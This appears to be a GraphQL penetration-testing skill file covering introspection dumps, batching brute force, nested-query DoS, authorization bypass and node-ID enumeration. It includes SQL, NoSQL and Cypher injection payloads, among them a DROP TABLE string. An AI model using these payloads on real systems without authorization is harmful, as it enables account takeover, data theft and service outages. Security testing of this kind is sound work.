---
name: graphql-attacks
description: GraphQL-specific attack methodology covering introspection, batching, authorization bypass, DoS, and injection techniques
depends_on: []
---

# GraphQL Attacks

GraphQL exposes a single endpoint with a flexible query language. This flexibility creates unique attack surfaces: clients choose what data to request, queries can be arbitrarily nested, and authorization must be enforced per-field rather than per-endpoint. Most GraphQL vulnerabilities stem from the assumption that schema visibility equals access control.

## Attack Surface

**Endpoint Discovery**
- Common paths: `/graphql`, `/graphiql`, `/playground`, `/api/graphql`, `/gql`, `/query`, `/v1/graphql`, `/api/v1/graphql`, `/graphql/console`, `/altair`
- Discovery via content-type: send `{"query":"{__typename}"}` with `Content-Type: application/json` to candidate endpoints
- Check for GraphQL IDE exposure: GraphiQL, Apollo Sandbox, Altair, Playground leak the full schema by default

```bash
# Endpoint brute-force
for path in graphql graphiql playground api/graphql gql query v1/graphql api/v1/graphql; do
  code=$(curl -s -o /dev/null -w "%{http_code}" -X POST "https://target.com/$path" \
    -H "Content-Type: application/json" \
    -d '{"query":"{__typename}"}')
  echo "$path: $code"
done
```

**Query Surfaces**
- Query (read), Mutation (write), Subscription (real-time)
- Arguments on any field (string, int, enum, custom scalars)
- Variables passed separately from query structure
- Directives (@skip, @include, custom)
- Fragments and inline fragments for type narrowing

## Introspection Attacks

### Full Schema Dump

If introspection is enabled, dump the entire type system:

```graphql
# Full introspection query
{
  __schema {
    queryType { name }
    mutationType { name }
    subscriptionType { name }
    types {
      name
      kind
      fields {
        name
        args { name type { name kind ofType { name kind } } }
        type { name kind ofType { name kind ofType { name kind } } }
      }
      inputFields { name type { name kind ofType { name kind } } }
      enumValues { name }
    }
  }
}
```

```bash
# Quick dump with curl
curl -s -X POST https://target.com/graphql \
  -H "Content-Type: application/json" \
  -d '{"query":"{__schema{queryType{name}mutationType{name}types{name kind fields{name args{name type{name kind ofType{name}}}type{name kind ofType{name kind}}}enumValues{name}}}}"}'
```

### Introspection Disabled - Workarounds

When `__schema` and `__type` are blocked:

```graphql
# Partial introspection - some implementations block __schema but not __type
{ __type(name: "User") { name fields { name type { name } } } }
{ __type(name: "Query") { name fields { name type { name } } } }

# Type name guessing
{ __type(name: "Admin") { name fields { name } } }
{ __type(name: "InternalUser") { name fields { name } } }
{ __type(name: "DeleteUser") { name fields { name } } }

# Field suggestion exploitation - some GraphQL servers suggest valid fields on typos
{ user { usrname } }
# Response: "Did you mean 'username', 'user_name', 'userName'?"

# Regex-filtered introspection - try alternate casing/encoding
{ __Schema { types { name } } }
{ __SCHEMA { types { name } } }
```

Common type names to guess: `User`, `Admin`, `Account`, `Order`, `Payment`, `Token`, `Session`, `Config`, `Setting`, `Role`, `Permission`, `InternalNote`, `AuditLog`, `Flag`, `Secret`.

## Batching Attacks

### Query Batching

GraphQL typically accepts arrays of operations in a single HTTP request:

```json
[
  {"query": "mutation { login(user:\"admin\", pass:\"password1\") { token } }"},
  {"query": "mutation { login(user:\"admin\", pass:\"password2\") { token } }"},
  {"query": "mutation { login(user:\"admin\", pass:\"password3\") { token } }"}
]
```

This bypasses per-request rate limiting - 1 HTTP request contains N operations.

### Alias-Based Batching

Even when array batching is blocked, aliases let you call the same field N times in one query:

```graphql
# 100 login attempts in a single query
{
  a1: login(user: "admin", pass: "password1") { token }
  a2: login(user: "admin", pass: "password2") { token }
  a3: login(user: "admin", pass: "password3") { token }
  # ... up to a100
}
```

Use cases:
- **Brute force**: bypass rate limits on login/OTP/reset endpoints
- **Race conditions**: N identical mutations execute in rapid succession (coupon redemption, balance transfer)
- **Amplification**: N expensive queries in one request for resource exhaustion

```bash
# Generate alias-based brute force payload
python3 -c "
passwords = open('wordlist.txt').read().splitlines()[:100]
queries = [f'a{i}: login(user: \"admin\", pass: \"{p}\") {{ token }}' for i, p in enumerate(passwords)]
print('{' + ' '.join(queries) + '}')
" > payload.graphql
```

## Nested Query DoS (Query Depth Attack)

Deeply nested queries cause exponential resolver execution:

```graphql
# Self-referential nesting - if User has friends who are Users
{
  user(id: 1) {
    friends {
      friends {
        friends {
          friends {
            friends {
              friends {
                username
                email
              }
            }
          }
        }
      }
    }
  }
}
```

```graphql
# Circular relationship exploitation
{
  posts {
    author {
      posts {
        author {
          posts {
            author {
              username
            }
          }
        }
      }
    }
  }
}
```

Amplification factor: if each level returns N items and you nest D levels deep, the server resolves N^D objects. With 10 items per level and 6 levels: 1,000,000 resolver calls.

### Query Complexity / Width Attack

Even with depth limits, wide queries consume resources:

```graphql
# Request every field on every type
{
  users(first: 1000) {
    id username email role
    posts(first: 1000) { id title body createdAt updatedAt }
    comments(first: 1000) { id body createdAt }
    notifications(first: 1000) { id message read }
    sessions(first: 1000) { id ip userAgent lastActive }
  }
}
```

## Authorization Bypass

### Path-Based Authorization Bypass

The same data may be accessible through different graph paths with different auth checks:

```graphql
# Direct access (blocked)
{ user(id: 42) { ssn } }

# Indirect access through relationships (may lack field-level auth)
{ post(id: 1) { author { ssn } } }

# Through nested relationships
{ comment(id: 5) { post { author { ssn } } } }

# Through search/list endpoints
{ users(filter: { role: "admin" }) { ssn email } }
```

### Field-Level Authorization Testing

Restricted fields may be accessible through indirect graph traversal:

```graphql
# Direct: user.admin_notes (blocked)
{ user(id: 1) { adminNotes } }

# Indirect: user -> posts -> author -> adminNotes (may bypass)
{ user(id: 1) { posts { author { adminNotes } } } }

# Through fragments on union/interface types
{
  search(query: "test") {
    ... on User { adminNotes }
    ... on Post { author { adminNotes } }
  }
}
```

### Mutation Authorization

Test if mutations enforce the same authorization as their corresponding queries:

```graphql
# Can read own profile (expected)
{ me { email role } }

# Can update own role? (should be blocked)
mutation { updateUser(id: 1, input: { role: "ADMIN" }) { role } }

# Can delete other users?
mutation { deleteUser(id: 42) { success } }

# Can access admin mutations without admin role?
mutation { setFeatureFlag(name: "debug", value: true) { success } }
```

## Injection in Arguments

### SQL Injection Through Resolvers

GraphQL arguments passed to database queries without sanitization:

```graphql
# String argument -> SQL
{ users(filter: "admin' OR '1'='1") { id username } }
{ user(name: "admin' UNION SELECT password FROM users--") { id } }

# orderBy/sortBy fields
{ users(orderBy: "username; DROP TABLE users--") { id } }
{ users(sort: "id ASC, (SELECT password FROM users LIMIT 1)") { id } }

# Search fields
{ search(query: "test' OR 1=1--") { id title } }
```

### NoSQL Injection

```graphql
# MongoDB operator injection via JSON arguments
{ users(filter: { username: "admin", password: { "$ne": "" } }) { id } }
{ users(filter: { username: { "$regex": "^a" } }) { id username } }
```

## IDOR via Node IDs

GraphQL relay-style APIs use global node IDs:

```graphql
# Decode base64 node ID
# "VXNlcjox" -> "User:1"
# "VXNlcjoy" -> "User:2"

# Enumerate via node interface
{ node(id: "VXNlcjox") { ... on User { email role ssn } } }
{ node(id: "VXNlcjoy") { ... on User { email role ssn } } }

# Sequential enumeration
{ node(id: "T3JkZXI6MQ==") { ... on Order { total items { name } } } }
# Order:1, Order:2, Order:3 ...

# If IDs are numeric, predictable, or sequential - iterate them
```

```bash
# Enumerate node IDs
for i in $(seq 1 100); do
  id=$(echo -n "User:$i" | base64)
  curl -s -X POST https://target.com/graphql \
    -H "Content-Type: application/json" \
    -d "{\"query\":\"{node(id:\\\"$id\\\"){...on User{id email role}}}\"}"
done
```

## Subscription Attacks

If the server exposes GraphQL subscriptions (typically over WebSocket):

```graphql
# Subscribe to events for other users
subscription {
  userNotifications(userId: 42) {
    message
    type
    data
  }
}

# Subscribe to admin/system events
subscription {
  systemEvents {
    type
    payload
  }
}

# Subscribe to all order updates (data leakage)
subscription {
  orderUpdated {
    orderId
    status
    customer { email }
    items { name price }
  }
}
```

```javascript
// WebSocket subscription test
const ws = new WebSocket("wss://target.com/graphql", "graphql-ws");
ws.onopen = () => {
  ws.send(JSON.stringify({
    type: "connection_init",
    payload: { Authorization: "Bearer <attacker-token>" }
  }));
  ws.send(JSON.stringify({
    id: "1",
    type: "start",
    payload: {
      query: "subscription { userNotifications(userId: 42) { message } }"
    }
  }));
};
ws.onmessage = (e) => console.log(e.data);
```

## Fragment and Directive Abuse

### Fragment Spread Attacks

```graphql
# Recursive fragments (if not limited)
fragment A on User { friends { ...B } }
fragment B on User { friends { ...A } }
{ user(id: 1) { ...A } }

# Fragment to access fields on unexpected types
{
  search(query: "test") {
    ... on InternalDocument { content classification }
    ... on User { email password_hash }
  }
}
```

### Directive Abuse

```graphql
# @skip and @include to probe field existence without triggering logging
{ user(id: 1) { email adminNotes @include(if: true) } }
{ user(id: 1) { email adminNotes @skip(if: false) } }

# Custom directives may have unintended behavior
{ user(id: 1) @cached { secretField } }
{ user(id: 1) @deprecated { legacyField } }
```

## Tools

- **InQL (Burp Extension)** - schema extraction, query generation, batch scanning
- **graphql-cop** - security audit tool, tests for common misconfigs
- **graphql-voyager** - interactive schema visualization from introspection
- **BatchQL** - automated alias-based batching attacks
- **CrackQL** - GraphQL brute force via alias batching
- **Clairvoyance** - schema extraction when introspection is disabled (field suggestion exploitation)
- **graphw00f** - GraphQL server fingerprinting (Apollo, Hasura, graphql-go, etc.)

```bash
# graphql-cop - quick security audit
python3 graphql-cop.py -t https://target.com/graphql

# Clairvoyance - extract schema without introspection
clairvoyance https://target.com/graphql -o schema.json -w wordlist.txt
```

## Testing Methodology

1. **Discover endpoint** - fuzz common paths, check for IDE exposure (GraphiQL, Playground)
2. **Dump schema** - full introspection; if blocked, use field suggestions, type guessing, or Clairvoyance
3. **Map authorization** - for each type and field, test access with no auth, low-priv, and target-user tokens
4. **Test indirect access** - query same data through different graph paths to find auth gaps
5. **Test mutations** - attempt privilege escalation, IDOR, and unauthorized writes
6. **Test batching** - send array batch and alias batch to check rate limit enforcement
7. **Test depth/complexity** - send nested queries to check for DoS protections
8. **Test injections** - SQL/NoSQL in string arguments, especially search, filter, and orderBy fields
9. **Test subscriptions** - subscribe to events belonging to other users
10. **Enumerate IDs** - decode relay node IDs, test sequential access

## Validation

1. If introspection is exposed: show the full schema dump and identify sensitive types/fields
2. If authorization bypass found: show the same data retrieved through the unauthorized path vs the expected denial on the direct path
3. If batching bypass works: show rate limit triggered on N individual requests, then N batched requests succeeding
4. If DoS via nesting: show measurable response time increase with depth (e.g., depth 3 = 100ms, depth 6 = 5s)
5. If injection confirmed: show data extraction via the GraphQL argument

## False Positives

- Introspection enabled in development/staging but disabled in production
- Schema types visible via introspection but resolvers return null or authorization errors
- Alias batching accepted syntactically but resolved sequentially with per-alias rate limits
- Node IDs that appear sequential but have server-side access checks on each resolution

## Impact

- Schema exposure reveals internal data models, hidden fields, and admin functionality
- Authorization bypass on fields exposes PII, credentials, internal notes, and admin controls
- Batching bypass enables brute force at scale against authentication and OTP endpoints
- Query depth attacks cause denial of service through exponential resolver computation
- IDOR via node IDs exposes other users' data (orders, profiles, messages)

## Defense-Bypass Pairs

| Defense | Bypass Technique | Real Example |
|---------|-----------------|--------------|
| Introspection disabled (`__schema` blocked) | `__type(name:"Query")` still works; field suggestion on typos | Clairvoyance tool extracts full schemas without introspection |
| Per-request rate limiting | Alias batching: 100 ops in 1 HTTP request counts as 1 | CrackQL brute-forced OTP via aliases, bypassed per-request limits |
| CSRF token required on POST | Send mutation via GET with URL-encoded query param | GitLab #1122408 - $3,370: mutations via GET bypassed CSRF middleware |
| Per-operation authorization | Legacy/versioned mutation (`FooLegacy`, `FooV1`) skips new checks | Shopify #927567 - $2,000: `ThemePublishLegacy` bypassed purchase entitlement |
| UI hides admin features from low-priv users | Call mutation directly via GraphQL — UI gating != API gating | Reddit #1658418 - $5,000: mod logs readable by any authenticated user |
| Query depth limiting | Wide queries instead of deep: `users(first:1000){posts(first:1000){...}}` | Width attack bypasses depth-only limiters with O(N*M) results |
| User deactivation revokes access | Deactivation enforced on REST but not GraphQL resolvers | GitLab #1192460 - $1,370: deactivated users retained GraphQL read access |
| Field-level auth on parent type | Query same field via nested relationship (`post.author.ssn`) | Shopify #882412 - $1,500: field expansion on `OrderListInitial` leaked PII |
| Resolver returns only UI-requested fields | Add fields from schema to selection set — resolver returns them all | Shopify #882412: adding 20+ fields to query returned data the UI never shows |
| Internal endpoints assumed unreachable | `/admin/internal/web/graphql/flow` reachable from any staff session | Shopify #1521336 - $1,600: internal GraphQL endpoint lacked permission checks |

## Chain Patterns

| Base Finding | Chain With | Combined Impact | Example |
|-------------|-----------|----------------|---------|
| Introspection leak (schema dump) | IDOR on discovered resolver | Mass data exfiltration of private objects | Google #846867456 - $50,000: schema revealed `userByEmail`, no authz |
| GraphQL CSRF via GET | Mutation creating public snippet | Stored XSS / data exfiltration via victim's session | GitLab #1122408: CSRF + snippet creation = attacker-readable victim data |
| Field-level auth bypass (PII leak) | Alias batching for enumeration | Mass PII harvesting at scale in single requests | Photo IDOR #787624390 - $25,000: aliases batch-enumerated private photos |
| IDOR on billing resolver | Cross-tenant ID enumeration | Platform-wide financial PII extraction | Shopify #2207248 - $5,000: billing IDOR leaked email, address, card info |
| Legacy mutation auth gap | Payment-bypass on paid resources | Free access to paid features + ownership transfer | Shopify #927567: `ThemePublishLegacy` granted paid theme ownership |
| Stored XSS via mutation input | Cross-app data flow to marketplace | XSS on downstream consumers visiting marketplace | Shopify #1085546 - $1,600: `productUpdate` XSS rendered on Handshake |
| Private field disclosure (binary oracle) | Product knowledge correlation | Enumerate existence of private programs/resources | HackerOne #715192 - $2,500: `vpn_suspended` revealed private programs |
| Missing permission check on internal endpoint | Workflow creation mutations | Invisible persistent backdoor via shadow automation | Shopify #1521336: invisible workflows via internal GraphQL endpoint |

## Framework-Specific Bypass Matrix

| Framework | Feature/Behavior | Bypass | Impact |
|-----------|-----------------|--------|--------|
| Apollo Server | `introspection: false` in production | `__type(name:"Query")` may still work; field suggestions in errors | Schema extraction without introspection |
| Apollo Server | `persistedQueries` allowlist | Send `extensions.persistedQuery` with arbitrary hash + full query fallback | Execute non-allowlisted queries |
| Hasura | Role-based column permissions | `x-hasura-admin-secret` header overrides all RBAC if leaked or default | Full database access as admin |
| Hasura | JWT claim-based authorization | Forge `x-hasura-allowed-roles` / `x-hasura-default-role` in JWT if secret weak | Role escalation to admin |
| graphql-js | Default error messages on validation | Type `{ user { usrname } }` — error reveals valid field names nearby | Schema enumeration via error messages |
| Graphene (Python) | `DjangoObjectType` auto-exposes model fields | Fields like `password_hash`, `is_staff`, `last_login` exposed unless excluded | Sensitive model attributes leaked |
| Hot Chocolate (.NET) | Authorization directives on types | Query field through interface/union without directive inheritance | Auth bypass via type narrowing |
| Absinthe (Elixir) | Subscription auth checked only at `subscribe` | Connection hijacking if WS token reuse not validated per-message | Subscribe to events of other users |

## Resolver Authorization Bypass Patterns

| Pattern | Technique | Where Found | Impact |
|---------|-----------|-------------|--------|
| Auth on operation, not field | Expand query selection set with undocumented fields | Shopify #882412 - $1,500 | Low-priv staff reads order PII, IPs, payment data |
| Auth on REST, not GraphQL | Same action unprotected on GraphQL surface | GitLab #1192460 - $1,370 | Deactivated users access all read queries |
| Auth on modern path, not legacy | Call `MutationLegacy` instead of `Mutation` | Shopify #927567 - $2,000 | Payment bypass on paid themes |
| Auth on UI, not resolver | Replay captured mutation with different arguments | Reddit #1658418 - $5,000 | Any user reads mod logs of any subreddit |
| Auth on type, not nested field | Query `parent.child.sensitiveField` through relationship | Shopify #423388 - $1,500 | Apps-only staff reads locations, marketing, apiKeys |
| Auth by session, not by object | Swap object ID in query variables | Google #846867456 - $50,000 | Any user queries any user's full PII by email |
| Auth check returns "not found" not "forbidden" | Response-type differential reveals resolver ran | Shopify #1010835 - $1,900 | Confirms auth bypass; valid ID would return data |
| Sensitive field naming ignored | Query fields prefixed `private_`, `internal_`, `admin_` | HackerOne #978143 - $2,500 | Private admin comments readable by any user |
| Visibility predicate missing on list | Query returns global results, not tenant-scoped | Shopify #1085332 - $1,900 | All apps including private ones returned to any merchant |
| Permission-pack mis-tagging | Security mutation tagged with lower permission tier | Shopify #1084892 - $1,900 | Store Management staff changes domain enforcement |

## Pro Tips

1. Always decode relay node IDs (base64) - they often reveal the type and numeric ID
2. Test authorization on every graph path to the same field, not just the obvious one
3. Alias batching works even when array batching is blocked - most rate limiters miss it
4. If introspection is disabled, send a malformed field name and check for suggestions in the error
5. GraphQL subscriptions over WebSocket often have weaker auth than HTTP queries
6. The `__typename` meta-field works everywhere and confirms a valid GraphQL endpoint
7. Test mutations with variables (separate from query) and inline arguments - authorization may differ
8. Search/filter arguments are the highest-probability injection points in GraphQL
9. If the server runs Hasura, check for the admin secret header: `x-hasura-admin-secret`
10. Document every accessible type/field pair with the minimum required privilege level
11. When you find one IDOR, immediately test all sibling operations on the same type - devs who forgot authz on one resolver forgot it on others (Shopify #2207248: both `BillingDocumentDownload` AND `BillDetails` were vulnerable)
12. Hunt mutations with `Legacy`/`V1`/`Internal`/`Old` suffixes - legacy paths routinely lag behind security checks added to modern paths ($2,000 Shopify theme bypass)
13. Classify response types per role: "access denied" = properly gated, "not found" = resolver ran without auth, "validation error" = resolver ran. The differential is your signal ($1,900 Shopify billing export)
14. Grep the schema for fields named `private_*`, `internal_*`, `admin_*`, `secret_*`, `hidden_*` - these naming patterns signal developer intent that auth should exist but often doesn't ($2,500 HackerOne campaign)
15. Check `/internal/`, `/admin-internal/`, `/web/graphql/{feature}` paths - internal GraphQL endpoints assume trusted clients and frequently skip permission checks ($1,600 invisible workflow creation)
16. For Cypher injection (Neo4j backends), test: `' WITH 1 AS x MATCH (a) RETURN a; //` - graph DB injection is structurally identical to SQLi but missed by most testers ($2,000 bounty)
17. Even harmless-looking boolean/list fields can be binary oracles: NULL vs non-NULL, empty vs non-empty array leaks resource existence when correlated with product knowledge ($2,500 private program disclosure)
18. On multi-tenant SaaS, always test cross-tenant ID swap on every GraphQL operation that takes an object ID - Shopify GIDs are sequential and enumerable ($5,000 billing data leak across all merchants)

## Summary

GraphQL's flexibility shifts security responsibility to per-field authorization, query complexity limits, and resolver input sanitization. Most real-world GraphQL bugs are authorization bypasses through alternate graph paths and batching abuse that sidesteps rate limits. Test every path to every field, not just the obvious one.
